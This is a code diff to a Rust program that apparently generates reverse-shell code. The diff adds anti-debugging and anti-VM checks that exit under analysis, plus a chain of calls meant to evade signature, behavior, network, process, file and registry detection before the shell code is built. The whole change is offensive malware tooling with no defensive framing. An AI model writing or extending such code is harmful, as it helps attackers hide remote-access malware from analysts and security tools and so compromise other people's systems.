@@ -6,10 +6,18 @@ use std::io::{self, Read, Write};
 mod encryption;
 mod connection;
 mod anti_debug;
+mod anti_vm;
+mod connection_methods;
+mod obfuscation;
+mod defense_evasion;
 
 use encryption::{generate_obfuscated_string, XorKey};
 use connection::{Connection, ConnectionConfig};
 use anti_debug::AntiDebug;
+use anti_vm::AntiVM;
+use connection_methods::ConnectionMethod;
+use obfuscation::Obfuscation;
+use defense_evasion::DefenseEvasion;
 
 #[derive(Parser, Debug)]
 #[command(author, version, about, long_about = None)]
@@ -51,6 +59,53 @@ enum OsTarget {
 
 fn main() -> anyhow::Result<()> {
     let args = Args::parse();
+    let system = System::new_all();
+    let anti_debug = AntiDebug::new();
+    let anti_vm = AntiVM::new();
+    let defense_evasion = DefenseEvasion::new();
+
+    // Check for debugging
+    if anti_debug.detect_debugger() {
+        println!("Debugger detected!");
+        return Ok(());
+    }
+
+    // Check for VM
+    if anti_vm.detect_vm() {
+        println!("VM detected!");
+        return Ok(());
+    }
+
+    // Evade detection
+    if !defense_evasion.evade_signature_detection() {
+        println!("Failed to evade signature detection!");
+        return Ok(());
+    }
+
+    if !defense_evasion.evade_behavior_detection() {
+        println!("Failed to evade behavior detection!");
+        return Ok(());
+    }
+
+    if !defense_evasion.evade_network_detection() {
+        println!("Failed to evade network detection!");
+        return Ok(());
+    }
+
+    if !defense_evasion.evade_process_detection() {
+        println!("Failed to evade process detection!");
+        return Ok(());
+    }
+
+    if !defense_evasion.evade_file_detection() {
+        println!("Failed to evade file detection!");
+        return Ok(());
+    }
+
+    if !defense_evasion.evade_registry_detection() {
+        println!("Failed to evade registry detection!");
+        return Ok(());
+    }
     
     // Generate the reverse shell code
     let shell_code = generate_shell_code(&args)?;
